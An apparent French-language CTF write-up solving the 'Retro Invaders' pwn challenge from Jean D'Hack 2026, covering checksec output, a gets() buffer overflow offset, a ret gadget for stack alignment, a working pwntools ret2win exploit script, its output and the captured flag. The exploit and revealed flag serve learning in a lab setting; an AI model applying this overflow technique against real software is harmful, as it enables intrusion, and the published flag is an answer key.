---
layout: post
title: "Jean D'Hack 2026 — Retro Invaders [Pwn]"
date: 2026-02-01 11:00:00 +0100
categories: [CTF, Jean-DHack-2026]
tags: [pwn, buffer-overflow, ret2win, rop, stack-alignment, medium]
toc: true
---

> **CTF :** Jean D'Hack 2026 · **Catégorie :** Pwn · **Difficulté :** ⭐⭐ Medium  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/jean-dhack-ctf/)**

---

## Description du challenge

Un binaire ELF 64-bit simulant un jeu d'arcade demande un nom de joueur.  
L'objectif : appeler la fonction cachée `win` pour lire `flag.txt`.

**Connexion :** `nc pwn.jeanne-hack-ctf.org <port>`  
**Fichier fourni :** `retro_level`

---

## Analyse statique du binaire

### Informations de base

```bash
file retro_level
# retro_level: ELF 64-bit LSB executable, x86-64

checksec --file=retro_level
# RELRO: Partial | Stack Canary: No | NX: Yes | PIE: No
```

Pas de stack canary → Buffer Overflow possible.  
Pas de PIE → Les adresses sont fixes et prédictibles.

### Identification des fonctions clés

Dans le pseudo-code (Ghidra/radare2), on identifie :

- `start_game()` : utilise `gets()` pour lire le nom dans un buffer `player_name[16]`
- `win()` : lit et affiche `flag.txt` — **jamais appelée normalement**

```
Adresse de gets()     : vulnérable — pas de limite de taille
Buffer player_name    : 16 octets
Adresse de win        : 0x00401216
```

---

## Calcul de l'offset

Sur une architecture x86-64, la structure de la stack au moment du `gets()` est :

```
[  player_name[16]  ][  RBP sauvegardé (8 octets)  ][  Adresse de retour  ]
```

L'offset pour écraser l'adresse de retour = `16 + 8 = **24 octets**`.

---

## Le problème d'alignement de stack

En 64-bit, certaines fonctions comme `fopen()` ou `printf()` exigent que la stack soit **alignée sur 16 octets**.  
Si on saute directement dans `win`, la stack peut être désalignée → crash avant d'afficher le flag.

**Solution :** On intercale un gadget `ret` (instruction `ret` seule) avant l'adresse de `win`.  
Ce gadget ne fait qu'avancer la stack de 8 octets, rétablissant l'alignement.

```bash
# Trouver un gadget ret dans le binaire
ROPgadget --binary retro_level | grep ": ret"
# 0x000000000040137c : ret
```

---

## Exploitation

```python
from pwn import *

HOST = "pwn.jeanne-hack-ctf.org"
PORT = <port>

RET_GADGET = p64(0x0040137c)   # gadget ret pour alignement
WIN_ADDR   = p64(0x00401216)   # adresse de la fonction win

payload = b"A" * 24            # padding pour atteindre l'adresse de retour
payload += RET_GADGET          # alignement de la stack
payload += WIN_ADDR            # on redirige vers win

p = remote(HOST, PORT)
p.sendlineafter(b"name", payload)
p.interactive()
```

### Exécution

```
$ python solve_retro.py
[+] Opening connection to pwn.jeanne-hack-ctf.org ...
[*] Switching to interactive mode
JDHACK{R3tr0_1nv4d3R_1337_0wnZ_4LL}
```

---

## Flag

```
JDHACK{R3tr0_1nv4d3R_1337_0wnZ_4LL}
```

---

## Ce que j'ai retenu

- La fonction `gets()` est **bannie** dans tout code de production pour cette raison exacte : elle ne limite jamais la taille de l'entrée.
- En 64-bit, **toujours tester l'alignement** de la stack avant de sauter sur une fonction qui appelle des syscalls 16-byte-aligned.
- Le pattern `padding + ret gadget + adresse cible` est la base du **ret2win**, premier type d'exploit buffer overflow à maîtriser.
